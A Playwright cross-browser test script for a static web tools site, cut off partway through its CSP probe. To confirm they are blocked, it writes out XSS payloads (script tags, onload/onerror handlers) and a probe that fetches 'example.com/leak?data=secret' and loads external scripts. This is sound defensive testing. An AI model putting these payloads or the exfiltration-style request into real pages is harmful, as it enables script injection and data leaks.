#!/usr/bin/env node
/**
 * Cross-browser and mobile-emulation test of the static export, with Playwright.
 *
 * The CDP smoke test (browser-smoke.mjs) covers Chrome in depth. This covers the
 * things that differ between engines, in Chromium, Firefox and WebKit:
 *
 * - every tool used end to end, with downloaded files checked byte for byte;
 * - the real file chooser (through the visible button), drag and drop, clipboard;
 * - workers start and are terminated; the on-page fallback without Worker and
 *   without OffscreenCanvas;
 * - image decoding, EXIF orientation, transparency, corrupt and unsupported files,
 *   results that grow, a large image (main-thread responsiveness), cancellation;
 * - object URLs released when results go away;
 * - the CSP failing closed: inline script, eval, external fetch/script/frame, blob
 *   workers and inline handlers are all attempted and must be refused;
 * - every request made during all of the above stays on the site's origin;
 * - keyboard focus order and visible focus;
 * - mobile emulation (Pixel 7, iPhone 13, iPhone SE): tap flows, 16 px form text
 *   (so iOS doesn't zoom on focus), no overflow in portrait or landscape.
 *
 * WebKit here is Playwright's WebKit build, which is close to Safari but is not
 * Apple's Safari. Emulated phones are not physical devices.
 *
 *   node scripts/cross-browser.mjs [--browsers chromium,firefox,webkit] [--report file]
 */

import { existsSync, readFileSync } from "node:fs";
import { writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { argv, env, exit } from "node:process";

import { chromium, devices, firefox, webkit } from "playwright";

import { startStaticServer } from "./static-server.mjs";

const flag = (name) => {
  const index = argv.indexOf(name);
  return index === -1 ? null : argv[index + 1];
};
const DEFAULT_SITE_URL = "https://everything-free-by-quilonix.github.io/everything-free-tools";
const basePath = new URL((env.NEXT_PUBLIC_SITE_URL?.trim() || DEFAULT_SITE_URL).replace(/\/+$/, "")).pathname.replace(
  /\/+$/,
  "",
);
const ENGINES = { chromium, firefox, webkit };
const selected = (flag("--browsers") ?? "chromium,firefox,webkit").split(",").filter((name) => name in ENGINES);

const TOOLS = ["json-formatter", "text-counter", "uuid-generator", "base64", "image-compressor", "qr-generator"];
const ROUTES = [
  "/",
  "/tools/",
  "/categories/developer/",
  "/categories/image/",
  ...TOOLS.map((slug) => `/tools/${slug}/`),
  "/privacy/",
];

/* -------------------------------------------------------------------------- */
/* Harness                                                                    */
/* -------------------------------------------------------------------------- */

const results = [];
let group = "";

/** No single check may hang the run. */
const CHECK_TIMEOUT_MS = 180_000;

async function check(name, fn) {
  const label = `${group} · ${name}`;
  let timer;
  try {
    const detail = await Promise.race([
      fn(),
      new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`timed out after ${CHECK_TIMEOUT_MS / 1000} s`)), CHECK_TIMEOUT_MS);
      }),
    ]);
    clearTimeout(timer);
    results.push({ label, ok: true, detail: detail ?? "" });
    console.log(`  ✓ ${name}${detail ? ` — ${detail}` : ""}`);
  } catch (error) {
    clearTimeout(timer);
    const message = (error instanceof Error ? error.message : String(error)).split("\n")[0];
    results.push({ label, ok: false, detail: message });
    console.log(`  ✗ ${name} — ${message}`);
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

/**
 * Instrumentation installed before any page script: CSP violations, worker
 * creation and termination, and live object URLs.
 */
const INSTRUMENT = ({ disable = [] } = {}) => `(() => {
  for (const name of ${JSON.stringify(disable)}) { try { window[name] = undefined; } catch {} }
  window.__csp = [];
  document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(e.violatedDirective));
  window.__workers = { created: 0, terminated: 0 };
  if (window.Worker) {
    const Native = window.Worker;
    window.Worker = class extends Native {
      constructor(url, options) { super(url, options); window.__workers.created += 1; }
      terminate() { window.__workers.terminated += 1; super.terminate(); }
    };
  }
  const live = new Set();
  window.__urls = live;
  const create = URL.createObjectURL.bind(URL);
  const revoke = URL.revokeObjectURL.bind(URL);
  URL.createObjectURL = (object) => { const url = create(object); live.add(url); return url; };
  URL.revokeObjectURL = (url) => { live.delete(url); revoke(url); };
})()`;

async function newContext(browser, origin, { device, disable, permissions } = {}) {
  const context = await browser.newContext({ ...(device ?? {}), acceptDownloads: true });
  await context.addInitScript({ content: INSTRUMENT({ disable }) });
  if (permissions) await context.grantPermissions(permissions, { origin }).catch(() => {});
  const log = { external: [], errors: [] };
  context.on("request", (request) => {
    const url = request.url();
    if (!url.startsWith(origin) && !/^(blob|data):/.test(url)) log.external.push(url);
  });
  context.on("page", (page) => attach(page, log));
  return { context, log };
}

function attach(page, log) {
  page.on("pageerror", (error) => log.errors.push(`pageerror: ${error.message}`));
  page.on("console", (message) => {
    if (message.type() === "error") log.errors.push(`console: ${message.text()}`);
  });
}

async function open(context, url) {
  const page = context.pages()[0] ?? (await context.newPage());
  await page.goto(url);
  await page.waitForFunction(() => document.documentElement.dataset.hydrated === "1", null, { timeout: 15_000 });
  // Let link prefetches finish. Navigating away mid-prefetch makes WebKit report the
  // aborted fetches as errors ("due to access control checks") on the page being
  // left, which would be misattributed to the next check.
  await page.waitForLoadState("networkidle").catch(() => {});
  return page;
}

async function download(page, trigger) {
  const [file] = await Promise.all([page.waitForEvent("download", { timeout: 15_000 }), trigger()]);
  const path = await file.path();
  return { name: file.suggestedFilename(), bytes: readFileSync(path) };
}

const magic = (bytes) =>
  bytes[0] === 0x89 && bytes[1] === 0x50
    ? "png"
    : bytes[0] === 0xff && bytes[1] === 0xd8
      ? "jpeg"
      : bytes.subarray(0, 4).toString() === "RIFF" && bytes.subarray(8, 12).toString() === "WEBP"
        ? "webp"
        : "unknown";

const STRICT_SVG =
  /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" viewBox="0 0 \d+ \d+" width="\d+" height="\d+" shape-rendering="crispEdges"><rect width="\d+" height="\d+" fill="#[0-9a-f]{6}"\/><path d="[Mhvz0-9 -]*" fill="#[0-9a-f]{6}"\/><\/svg>$/;

/* -------------------------------------------------------------------------- */
/* Fixtures, generated once in Chromium so every browser gets identical bytes  */
/* -------------------------------------------------------------------------- */

async function makeFixtures(browser) {
  const page = await browser.newPage();
  await page.setContent("<html><body></body></html>");
  const image = (spec) =>
    page
      .evaluate(async ({ w, h, type, alpha, noise, quality }) => {
        const canvas = document.createElement("canvas");
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext("2d");
        if (noise) {
          const data = ctx.createImageData(w, h);
          for (let i = 0; i < data.data.length; i += 65536)
            crypto.getRandomValues(data.data.subarray(i, Math.min(i + 65536, data.data.length)));
          for (let i = 3; i < data.data.length; i += 4) data.data[i] = 255;
          ctx.putImageData(data, 0, 0);
        } else {
          ctx.fillStyle = "#d4af37";
          ctx.fillRect(0, 0, alpha ? Math.ceil(w / 2) : w, h);
        }
        const blob = await new Promise((done) => canvas.toBlob(done, type, quality));
        const bytes = new Uint8Array(await blob.arrayBuffer());
        let text = "";
        for (let i = 0; i < bytes.length; i += 0x8000) text += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
        return btoa(text);
      }, spec)
      .then((b64) => Buffer.from(b64, "base64"));

  const landscapeJpeg = await image({ w: 64, h: 32, type: "image/jpeg", quality: 0.9 });
  // EXIF orientation 6 (rotate 90° clockwise): displayed correctly it is 32×64.
  const tiff = [0x4d, 0x4d, 0x00, 0x2a, 0, 0, 0, 8, 0, 1, 0x01, 0x12, 0, 3, 0, 0, 0, 1, 0, 6, 0, 0, 0, 0, 0, 0];
  const payload = [0x45, 0x78, 0x69, 0x66, 0, 0, ...tiff];
  const app1 = Buffer.from([0xff, 0xe1, (payload.length + 2) >> 8, (payload.length + 2) & 255, ...payload]);
  const rotatedJpeg = Buffer.concat([landscapeJpeg.subarray(0, 2), app1, landscapeJpeg.subarray(2)]);

  const fixtures = {
    transparentPng: {
      name: "logo.png",
      mimeType: "image/png",
      buffer: await image({ w: 64, h: 48, type: "image/png", alpha: true }),
    },
    rotatedJpeg: { name: "portrait.jpg", mimeType: "image/jpeg", buffer: rotatedJpeg },
    webp: {
      name: "photo.webp",
      mimeType: "image/webp",
      buffer: await image({ w: 40, h: 30, type: "image/webp", quality: 0.9 }),
    },
    tinyPng: { name: "tiny.png", mimeType: "image/png", buffer: await image({ w: 1, h: 1, type: "image/png" }) },
    tallPng: { name: "tall.png", mimeType: "image/png", buffer: await image({ w: 1, h: 3000, type: "image/png" }) },
    largeJpeg: {
      name: "large.jpg",
      mimeType: "image/jpeg",
      buffer: await image({ w: 3000, h: 2000, type: "image/jpeg", noise: true, quality: 0.95 }),
    },
    hugePng: {
      name: "huge.png",
      mimeType: "image/png",
      buffer: await image({ w: 6000, h: 4000, type: "image/png", alpha: true }),
    },
    broken: {
      name: "broken.png",
      mimeType: "image/png",
      buffer: Buffer.from("this is not an image at all, just text pretending"),
    },
    gif: {
      name: "anim.gif",
      mimeType: "image/gif",
      buffer: Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"),
    },
    binary: {
      name: "data.bin",
      mimeType: "application/octet-stream",
      buffer: Buffer.from([0, 1, 2, 250, 251, 252, 253, 254, 255, 0x89, 0x50]),
    },
  };
  await page.close();
  assert(magic(fixtures.webp.buffer) === "webp", "fixture WebP was not encoded as WebP");
  return fixtures;
}

/* -------------------------------------------------------------------------- */
/* Desktop checks, per browser                                                */
/* -------------------------------------------------------------------------- */

async function desktopChecks(name, browser, site, origin, fixtures) {
  group = `${name} desktop`;
  console.log(`\n${group}`);
  const permissions = name === "chromium" ? ["clipboard-read", "clipboard-write"] : undefined;
  const { context, log } = await newContext(browser, origin, { permissions });
  const page = await context.newPage();

  await check("capabilities", async () => {
    await open(context, `${site}/`);
    const caps = await page.evaluate(() => ({
      worker: typeof Worker !== "undefined",
      offscreen: typeof OffscreenCanvas !== "undefined",
      bitmap: typeof createImageBitmap === "function",
      segmenter: typeof Intl.Segmenter === "function",
      randomUUID: typeof crypto.randomUUID === "function",
      clipboard: typeof navigator.clipboard?.writeText === "function",
    }));
    const webpEncode = await page
      .evaluate(async () => {
        const canvas = new OffscreenCanvas(2, 2);
        canvas.getContext("2d");
        return (await canvas.convertToBlob({ type: "image/webp" })).type;
      })
      .catch((error) => `error: ${error.message}`);
    return `${Object.entries(caps)
      .map(([key, value]) => `${key}=${value ? "yes" : "no"}`)
      .join(" ")} webp-encode=${webpEncode === "image/webp" ? "yes" : "no (" + webpEncode + ")"}`;
  });

  for (const route of ROUTES) {
    await check(`load ${route}`, async () => {
      log.errors.length = 0;
      await open(context, `${site}${route}`);
      const csp = await page.evaluate(() => window.__csp);
      assert(csp.length === 0, `CSP violations: ${csp.join(", ")}`);
      assert(log.errors.length === 0, log.errors.slice(0, 2).join("; "));
    });
  }

  await check("JSON: format in a worker, exact numbers, download, copy", async () => {
    await open(context, `${site}/tools/json-formatter/`);
    await page.locator("textarea").first().fill('{"big":12345678901234567890,"f":1.0,"e":1E2,"z":-0,"s":"\\u00e9😀"}');
    await page.getByRole("button", { name: "Format JSON" }).click();
    const output = page.locator("textarea[readonly]");
    await output.waitFor();
    const text = await output.inputValue();
    for (const raw of ["12345678901234567890", "1.0", "1E2", "-0", '"\\u00e9😀"'])
      assert(text.includes(raw), `${raw} changed`);
    const workers = await page.evaluate(() => window.__workers);
    assert(workers.created === 1 && workers.terminated === 1, `workers ${JSON.stringify(workers)}`);
    const file = await download(page, () => page.getByRole("link", { name: "Download .json" }).click());
    assert(file.name === "formatted.json" && file.bytes.toString("utf8") === text, "download differs from output");
    await page.getByRole("button", { name: "Copy", exact: true }).click();
    const copied = await page
      .getByText("Copied to the clipboard.")
      .waitFor({ state: "attached", timeout: 3000 })
      .then(
        () => "copied",
        () => "failed",
      );
    let clip = "";
    if (copied === "copied" && permissions) {
      // The Windows clipboard stores line breaks as CRLF.
      const pasted = (await page.evaluate(() => navigator.clipboard.readText())).replace(/\r\n/g, "\n");
      clip = pasted === text ? " (clipboard verified)" : " (clipboard MISMATCH)";
    }
    assert(!clip.includes("MISMATCH"), "clipboard content differs");
    if (copied === "failed") assert(await page.getByText("Couldn’t copy").isVisible(), "copy failed silently");
    return `worker ok, download ok, copy ${copied}${clip}`;
  });

  await check("JSON: error location", async () => {
    await page.locator("textarea").first().fill('{\n  "a": 1,\n}');
    await page.getByRole("button", { name: "Format JSON" }).click();
    await page.getByText("Line 3, column 1").waitFor();
  });

  await check("JSON: worker start-up and round trip (small and multi-megabyte documents)", async () => {
    // Timed inside the page: click to rendered result, including worker creation.
    const timings = await page.evaluate(async () => {
      const area = document.querySelector("textarea");
      const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set;
      const run = async (text, ready) => {
        setter.call(area, text);
        area.dispatchEvent(new Event("input", { bubbles: true }));
        await new Promise((done) => setTimeout(done, 50));
        const start = performance.now();
        [...document.querySelectorAll("button")].find((b) => b.textContent.trim() === "Format JSON").click();
        while (!ready()) {
          if (performance.now() - start > 60_000) throw new Error("no result after 60 s");
          await new Promise((done) => setTimeout(done, 5));
        }
        return Math.round(performance.now() - start);
      };
      const output = () => document.querySelector("textarea[readonly]")?.value ?? "";
      const small = [];
      for (let i = 0; i < 5; i += 1) {
        small.push(await run(`{"run":${i},"ok":true}`, () => output().includes(`"run": ${i}`)));
      }
      const big = JSON.stringify({
        rows: Array.from({ length: 60000 }, (_, i) => ({ id: i, name: `row ${i}`, value: i * 1.5 })),
      });
      // Only the first 100,000 characters are displayed, with a notice saying so.
      const large = await run(
        big,
        () => output().startsWith('{\n  "rows": [') && document.body.innerText.includes("Showing the first 100,000 of"),
      );
      return { small: small.sort((a, b) => a - b)[2], large, size: big.length };
    });
    return `small: median ${timings.small} ms; ${(timings.size / 1e6).toFixed(1)} MB: ${timings.large} ms`;
  });

  await check("Text counter: grapheme and word counts", async () => {
    await open(context, `${site}/tools/text-counter/`);
    await page.locator("textarea").fill("Hello wörld. Two sentences here! 👨‍👩‍👧");
    const stat = (label) =>
      page.locator("dl > div", { has: page.locator("dt", { hasText: new RegExp(`^${label}$`) }) }).locator("dd");
    await page.waitForFunction(() => document.querySelector("dl dd")?.textContent === "5");
    const [words, chars, sentences] = await Promise.all([
      stat("Words").textContent(),
      stat("Characters").textContent(),
      stat("Sentences").textContent(),
    ]);
    assert(
      words === "5" && chars === "34" && sentences === "2",
      `words=${words} characters=${chars} sentences=${sentences}`,
    );
    const fallback = await page.getByText("doesn’t have Intl.Segmenter").count();
    return fallback ? "fallback counting (no Intl.Segmenter)" : "Intl.Segmenter";
  });

  await check("UUID: v4 and v7 batches, unique, ordered, download", async () => {
    await open(context, `${site}/tools/uuid-generator/`);
    await page.locator("input[type=number]").fill("50");
    await page.getByRole("button", { name: "Generate" }).click();
    const v4a = (await page.locator("textarea[readonly]").inputValue()).split("\n");
    await page.getByRole("button", { name: "Generate" }).click();
    const v4b = (await page.locator("textarea[readonly]").inputValue()).split("\n");
    assert(
      v4a.every((u) => /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(u)),
      "invalid v4",
    );
    assert(new Set([...v4a, ...v4b]).size === 100, "repeated UUIDs across batches");
    await page.locator("label", { hasText: "v7 · time-ordered" }).click();
    await page.getByRole("button", { name: "Generate" }).click();
    await page.waitForFunction(() => document.querySelector("textarea[readonly]")?.value.split("\n")[0]?.[14] === "7");
    const v7 = (await page.locator("textarea[readonly]").inputValue()).split("\n");
    assert(
      v7.every((u) => /^[0-9a-f]{8}-[0-9a-f]{4}-7[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(u)),
      "invalid v7",
    );
    assert(JSON.stringify([...v7].sort()) === JSON.stringify(v7), "v7 not in order");
    const ms = parseInt(v7[0].replace(/-/g, "").slice(0, 12), 16);
    assert(Math.abs(ms - Date.now()) < 60_000, "v7 timestamp is not the current time");
    const file = await download(page, () => page.getByRole("link", { name: "Download .txt" }).click());
    assert(file.bytes.toString("utf8").trim().split("\n").join() === v7.join(), "download differs");
  });

  await check("Base64: Unicode, strict errors, file encode via chooser, binary decode download", async () => {
    await open(context, `${site}/tools/base64/`);
    const input = page.locator("textarea").first();
    await input.fill("héllo 😀 ನಮಸ್ಕಾರ");
    await page.getByRole("button", { name: "Encode", exact: true }).click();
    const expected = Buffer.from("héllo 😀 ನಮಸ್ಕಾರ").toString("base64");
    assert((await page.locator("textarea[readonly]").inputValue()) === expected, "wrong encoding");
    await page.locator("label", { hasText: /^Decode$/ }).click();
    await input.fill("Zm9v$YmFy");
    await page.getByRole("button", { name: "Decode", exact: true }).click();
    await page.getByRole("alert").filter({ hasText: "isn't a Base64 character" }).waitFor();
    await input.fill(fixtures.binary.buffer.toString("base64"));
    await page.getByRole("button", { name: "Decode", exact: true }).click();
    const decoded = await download(page, () => page.getByRole("link", { name: /Download decoded\./ }).click());
    assert(decoded.bytes.equals(fixtures.binary.buffer), "binary decode differs");
    await page.locator("label", { hasText: /^Encode$/ }).click();
    await page.locator("label", { hasText: /^File$/ }).click();
    const [chooser] = await Promise.all([
      page.waitForEvent("filechooser"),
      page.getByText("Choose a file", { exact: true }).click(),
    ]);
    await chooser.setFiles(fixtures.binary);
    await page.waitForFunction(
      (value) => document.querySelector("textarea[readonly]")?.value === value,
      fixtures.binary.buffer.toString("base64"),
    );
    return "chooser opened from the visible button";
  });

  await check("Image: batch via file chooser (PNG alpha, EXIF JPEG, WebP, tiny, tall, corrupt)", async () => {
    await open(context, `${site}/tools/image-compressor/`);
    const [chooser] = await Promise.all([
      page.waitForEvent("filechooser"),
      page.getByText("Choose files", { exact: true }).click(),
    ]);
    await chooser.setFiles([
      fixtures.transparentPng,
      fixtures.rotatedJpeg,
      fixtures.webp,
      fixtures.tinyPng,
      fixtures.tallPng,
      fixtures.broken,
    ]);
    await page.getByRole("button", { name: "Compress 6 images" }).click();
    await page.waitForFunction(() => /Compressed \d+ of 6/.test(document.body.innerText), null, { timeout: 30_000 });
    const row = (fileName) => page.locator("li", { hasText: fileName });
    const notes = [];

    const logo = await row("logo.png").innerText();
    assert(logo.includes("64 × 48"), "PNG dimensions missing");
    const logoFile = await download(page, () => row("logo.png").getByRole("link", { name: "Download" }).click());
    const logoType = magic(logoFile.bytes);
    assert(
      logoFile.name === `logo-compressed.${logoType === "jpeg" ? "jpg" : logoType}`,
      `name ${logoFile.name} vs bytes ${logoType}`,
    );
    assert(logoType === "webp" || logoType === "png", `transparent image became ${logoType}`);
    if (logoType === "png") {
      assert(logo.includes("can’t create WebP"), "WebP substitution not disclosed");
      notes.push("WebP encode unsupported → PNG, disclosed");
    }

    const portrait = await row("portrait.jpg").innerText();
    // Stored 64×32 with orientation 6: both the decoded original and the output must be 32×64.
    assert(
      (portrait.match(/32 × 64/g) ?? []).length === 2 && !portrait.includes("64 × 32"),
      `EXIF orientation not applied: ${portrait.replace(/\n/g, " | ")}`,
    );
    assert(/WebP · /.test(await row("photo.webp").innerText()), "WebP input not read");
    assert((await row("tiny.png").innerText()).includes("isn’t smaller"), "growth not reported for a 1×1 image");
    assert((await row("tall.png").innerText()).includes("1 × 3000"), "unusual dimensions mishandled");
    assert(await row("broken.png").getByRole("alert").isVisible(), "corrupt file error not shown");
    const workers = await page.evaluate(() => window.__workers);
    assert(workers.created === workers.terminated, `workers left running ${JSON.stringify(workers)}`);
    notes.push(workers.created > 0 ? `${workers.created} workers, all terminated` : "no workers (page fallback)");

    await page.getByRole("button", { name: "Remove all" }).click();
    await page.waitForTimeout(300);
    const live = await page.evaluate(() => window.__urls.size);
    assert(live === 0, `${live} object URLs still alive after Remove all`);
    // The button removed itself; focus must land somewhere useful, not on <body>.
    const focused = await page.evaluate(
      () => `${document.activeElement?.tagName}[${document.activeElement?.type ?? ""}]`,
    );
    assert(focused === "INPUT[file]", `focus after Remove all: ${focused}`);
    return notes.join("; ");
  });

  await check("Image: GIF rejected with a reason; drag and drop works", async () => {
    await page.locator("input[type=file]").setInputFiles(fixtures.gif);
    await page.getByText("image/gif files aren't supported here.").waitFor();
    const transfer = await page.evaluateHandle(
      ({ b64, name, type }) => {
        const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
        const data = new DataTransfer();
        data.items.add(new File([bytes], name, { type }));
        return data;
      },
      { b64: fixtures.transparentPng.buffer.toString("base64"), name: "dropped.png", type: "image/png" },
    );
    const zone = page.locator("input[type=file]").locator("..");
    await zone.dispatchEvent("dragover", { dataTransfer: transfer });
    await zone.dispatchEvent("drop", { dataTransfer: transfer });
    await page.locator("li", { hasText: "dropped.png" }).waitFor();
    await page.getByRole("button", { name: "Remove all" }).click();
  });

  await check("Image: large photo (3000×2000) keeps the page responsive", async () => {
    await page.locator("input[type=file]").setInputFiles(fixtures.largeJpeg);
    await page.evaluate(() => {
      window.__gap = 0;
      let last = performance.now();
      window.__beat = setInterval(() => {
        const now = performance.now();
        window.__gap = Math.max(window.__gap, now - last);
        last = now;
      }, 16);
    });
    const start = Date.now();
    await page.getByRole("button", { name: "Compress" }).click();
    await page
      .locator("li", { hasText: "large.jpg" })
      .getByRole("link", { name: "Download" })
      .waitFor({ timeout: 60_000 });
    const elapsed = Date.now() - start;
    const gap = await page.evaluate(() => (clearInterval(window.__beat), Math.round(window.__gap)));
    const text = await page.locator("li", { hasText: "large.jpg" }).innerText();
    await page.getByRole("button", { name: "Remove all" }).click();
    assert(gap < 1000, `main thread blocked for ${gap} ms`);
    return `${(fixtures.largeJpeg.buffer.length / 1e6).toFixed(1)} MB in ${elapsed} ms, longest main-thread gap ${gap} ms; ${text.match(/→[^\n]*/)?.[0] ?? ""}`;
  });

  await check("Image: 24-megapixel transparent PNG", async () => {
    await page.locator("input[type=file]").setInputFiles(fixtures.hugePng);
    await page.evaluate(() => {
      window.__gap = 0;
      let last = performance.now();
      window.__beat = setInterval(() => {
        const now = performance.now();
        window.__gap = Math.max(window.__gap, now - last);
        last = now;
      }, 16);
    });
    const start = Date.now();
    await page.getByRole("button", { name: "Compress" }).click();
    const row = page.locator("li", { hasText: "huge.png" });
    await Promise.race([
      row.getByRole("link", { name: "Download" }).waitFor({ timeout: 90_000 }),
      row.getByRole("alert").waitFor({ timeout: 90_000 }),
    ]);
    const elapsed = Date.now() - start;
    const gap = await page.evaluate(() => (clearInterval(window.__beat), Math.round(window.__gap)));
    const text = (await row.innerText()).replace(/\n/g, " | ");
    await page.getByRole("button", { name: "Remove all" }).click();
    assert(/6000 × 4000/.test(text), text);
    const output = text
      .split(" | ")
      .find(
        (part) =>
          /^(WebP|PNG|JPEG) · .* · 6000 × 4000/.test(part) &&
          part !== text.split(" | ").find((p) => p.startsWith("PNG · ")),
      );
    return `${elapsed} ms, longest main-thread gap ${gap} ms; output ${output ?? "?"}`;
  });

  await check("Image: cancel stops the job and no stale result appears", async () => {
    await page
      .locator("input[type=file]")
      .setInputFiles([fixtures.hugePng, { ...fixtures.hugePng, name: "huge-2.png" }]);
    // Start, then cancel 150 ms later from inside the page. When the page itself is
    // doing the work (no OffscreenCanvas), the click is only handled once the current
    // image's long task ends, so that image may legitimately finish first. What must
    // hold: once the cancel has been handled, no further result ever appears.
    const cancelled = await page.evaluate(async () => {
      const button = (name) => [...document.querySelectorAll("button")].find((b) => b.textContent.trim() === name);
      button("Compress 2 images").click();
      await new Promise((done) => setTimeout(done, 150));
      const cancel = button("Cancel");
      cancel?.click();
      // Let React commit the cancel, then count what finished before it.
      await new Promise((done) => setTimeout(done, 50));
      return { clicked: Boolean(cancel), atCancel: document.querySelectorAll("main li a[download]").length };
    });
    assert(cancelled.clicked, "no Cancel button 150 ms after starting");
    await page.waitForTimeout(5000);
    const links = await page.locator("main li a[download]").count();
    const workers = await page.evaluate(() => window.__workers);
    const enabled = await page.getByRole("button", { name: /Compress/ }).isEnabled();
    await page.getByRole("button", { name: "Remove all" }).click();
    assert(
      links === cancelled.atCancel,
      `${links - cancelled.atCancel} result(s) appeared after the cancel was handled`,
    );
    assert(links < 2, "both images finished: the cancel had no effect");
    assert(workers.created === workers.terminated, `worker not terminated ${JSON.stringify(workers)}`);
    assert(enabled, "Compress not available again after cancel");
    return cancelled.atCancel === 0
      ? "stopped before any result"
      : "the image in progress finished first (page busy); the rest stopped";
  });

  await check("QR: hostile text stays inert; SVG and PNG downloads are valid", async () => {
    await open(context, `${site}/tools/qr-generator/`);
    const hostile = `<svg onload=alert(1)><script>alert(1)</script><img src=x onerror=alert(1)>"'&amp;&<>ನ😀`;
    await page.locator("textarea").fill(hostile);
    await page.locator('svg[role="img"] path').waitFor();
    const svg = await download(page, () => page.getByRole("link", { name: "Download SVG" }).click());
    assert(STRICT_SVG.test(svg.bytes.toString("utf8")), "SVG contains something other than shapes and colours");
    const png = await download(page, () => page.getByRole("link", { name: "Download PNG" }).click());
    assert(magic(png.bytes) === "png", "PNG download is not a PNG");
    const injected = await page.evaluate(
      () =>
        document.querySelectorAll(
          'main script:not([type="application/ld+json"]), main img, main svg svg, main [onerror], main [onload]',
        ).length,
    );
    assert(injected === 0, `${injected} injected elements`);
    const again = await download(page, () => page.getByRole("link", { name: "Download SVG" }).click());
    assert(again.bytes.equals(svg.bytes), "SVG output is not deterministic");
    await page.locator("label", { hasText: "Wi-Fi network" }).click();
    const fields = page.locator('main input:not([type]), main input[type="text"]');
    await fields.nth(0).fill('Home;Net"<b>');
    await fields.nth(1).fill("correct horse");
    await page.locator('svg[role="img"][aria-label*="Home;Net"]').waitFor();
    await page.locator("label", { hasText: "Link or text" }).click();
    await page.locator("textarea").fill("");
    await page.waitForTimeout(300);
    const live = await page.evaluate(() => window.__urls.size);
    assert(live === 0, `${live} object URLs alive after clearing`);
  });

  await check("keyboard: every focus stop on a tool page is visible", async () => {
    // A fresh load, no click: sequential focus starts at the top of the document.
    await open(context, `${site}/tools/image-compressor/`);
    const stops = [];
    // Safari's default Tab moves between form controls only; Option+Tab (Alt+Tab here) includes links.
    const key = name === "webkit" ? "Alt+Tab" : "Tab";
    for (let i = 0; i < 50; i += 1) {
      await page.keyboard.press(key);
      const stop = await page.evaluate(() => {
        const el = document.activeElement;
        if (!el || el === document.body) return null;
        // The indicator may be drawn by the element, a wrapping label, the label that
        // follows a visually hidden input, or a card around a link.
        const candidates = [el];
        for (let node = el.parentElement, depth = 0; node && depth < 4; node = node.parentElement, depth += 1)
          candidates.push(node);
        if (el.nextElementSibling?.tagName === "LABEL") candidates.push(el.nextElementSibling);
        const visible = candidates.some((node) => {
          const rect = node.getBoundingClientRect();
          const style = getComputedStyle(node);
          return (
            rect.width > 2 && rect.height > 2 && style.outlineStyle !== "none" && parseFloat(style.outlineWidth) > 0
          );
        });
        const text = (
          el.getAttribute("aria-label") ||
          el.textContent ||
          el.closest("label")?.textContent ||
          el.nextElementSibling?.textContent ||
          ""
        ).trim();
        return { what: `${el.tagName.toLowerCase()}${el.type ? `[${el.type}]` : ""} ${text.slice(0, 28)}`, visible };
      });
      if (!stop) continue;
      if (stops.length && stops[0].what === stop.what) break;
      stops.push(stop);
    }
    const hidden = stops.filter((stop) => !stop.visible);
    const linksReached = stops.some((stop) => stop.what.startsWith("a "));
    // WebKit's default keyboard mode, like Safari's, skips links; its users turn on
    // "Press Tab to highlight each item". The controls it does reach must still work.
    if (name !== "webkit" || linksReached) {
      assert(stops.length > 5, `only ${stops.length} focus stops: ${stops.map((s) => s.what).join(", ")}`);
      assert(stops[0].what.includes("Skip to main content"), `first stop: ${stops[0].what}`);
    }
    assert(
      stops.some((stop) => stop.what.startsWith("input[file]")),
      `file input not reachable: ${stops.map((s) => s.what).join(", ")}`,
    );
    assert(hidden.length === 0, `no visible focus on: ${hidden.map((stop) => stop.what).join(", ")}`);
    return `${stops.length} stops with ${key}${linksReached ? "" : " (form controls only: engine default skips links)"}, all with a visible indicator`;
  });

  await check("no request left the site's origin", async () => {
    assert(log.external.length === 0, `${log.external.length} external: ${log.external.slice(0, 3).join(", ")}`);
    return "0 external requests during all tool use";
  });

  await context.close();

  // Its own context: the probes deliberately try to reach another origin.
  await check("CSP fails closed", async () => {
    const { context: probeContext } = await newContext(browser, origin);
    const reached = [];
    probeContext.on("response", (response) => {
      if (response.url().includes("example.com")) reached.push(response.url());
    });
    const page = await probeContext.newPage();
    await open(probeContext, `${site}/tools/json-formatter/`);
    const probe = await page.evaluate(async () => {
      const out = {};
      window.__ran = false;
      const inline = document.createElement("script");
      inline.textContent = "window.__ran = true";
      document.body.append(inline);
      out.inlineScript = window.__ran ? "RAN" : "blocked";
      try {
        // eslint-disable-next-line no-implied-eval -- deliberate: the CSP must refuse string timers
        setTimeout("window.__timer = true", 0);
      } catch {}
      await new Promise((done) => setTimeout(done, 50));
      out.stringTimer = window.__timer ? "RAN" : "blocked";
      out.fetch = await fetch("https://example.com/leak?data=secret").then(
        () => "SENT",
        () => "blocked",
      );
      out.externalScript = await new Promise((done) => {
        const script = document.createElement("script");
        script.src = "https://example.com/x.js";
        script.onload = () => done("LOADED");
        script.onerror = () => done("blocked");
        document.body.append(script);
        setTimeout(() => done("blocked"), 1500);
      });
      out.blobWorker = await new Promise((done) => {
        try {
          const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" })));
          worker.onmessage = () => done("RAN");
          worker.onerror = () => done("blocked");
          setTimeout(() => done("blocked"), 1500);
        } catch {
          done("blocked");
        }
      });
      const styled = document.createElement("div");
      styled.setAttribute("style", "width: 123px");
      const sheet = document.createElement("style");
      sheet.textContent = "#probe-sheet { width: 77px; }";
      styled.id = "probe-sheet";
      document.body.append(styled, sheet);
      const width = getComputedStyle(styled).width;
      out.inlineStyle = width === "123px" || width === "77px" ? "APPLIED" : "blocked";
      styled.remove();
      sheet.remove();
      const handler = document.createElement("div");
      handler.setAttribute("onclick", "window.__handler = true");
      document.body.append(handler);
      handler.click();
      out.inlineHandler = window.__handler ? "RAN" : "blocked";
      const frame = document.createElement("iframe");
      frame.src = "https://example.com/";
      document.body.append(frame);
      await new Promise((done) => setTimeout(done, 800));
